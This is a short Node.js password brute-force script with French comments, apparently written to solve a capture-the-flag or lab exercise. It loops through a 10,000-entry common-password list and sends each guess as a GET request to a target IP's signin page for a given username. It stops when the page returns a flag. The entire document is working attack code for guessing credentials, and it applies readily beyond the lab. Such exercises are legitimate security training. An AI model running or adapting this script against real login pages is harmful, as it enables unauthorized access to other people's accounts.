const http = require('http')
const fs = require('fs')
const { exit } = require('process')

if (process.argv.length !== 4) {
	console.error("Usage: node bruteForce.js <ip> <username>")
	exit(1)
}

const passwords = fs.readFileSync(__dirname + '/10k-most-common.txt').toString('utf-8').split('\n');

(async () => {
	for (i in passwords) {
		//Pour ne pas trop spam la vm, qui ne peut pas gérer 10k requêtes en même temps
		await sleep(30)
		sendReq(process.argv[2], process.argv[3], passwords[i])
	}
})()

//De https://stackoverflow.com/a/39914235/12121518
function sleep(ms) {
	return new Promise(r => setTimeout(r, ms))
}

function sendReq(ip, user, password) {
	console.log(`Test du mdp ${password}`)
	http.request(`http://${ip}/index.php?page=signin&username=${user}&password=${password}&Login=Login#`, res => reqCb(user, password, res)).end()
}

//Récupéré de https://nodejs.org/en/knowledge/HTTP/clients/how-to-create-a-HTTP-request/
function reqCb(user, password, res) {
	str = ""
	res.on('data', chunk => {
		str += chunk;
	})
	res.on('end', () => {
		let match = /The flag is : (\S*)/.exec(str)
		if (match) {
			console.log(`user: ${user}, password: ${password}, flag: ${match[1]}`)
			exit(0)
		}
	})
}
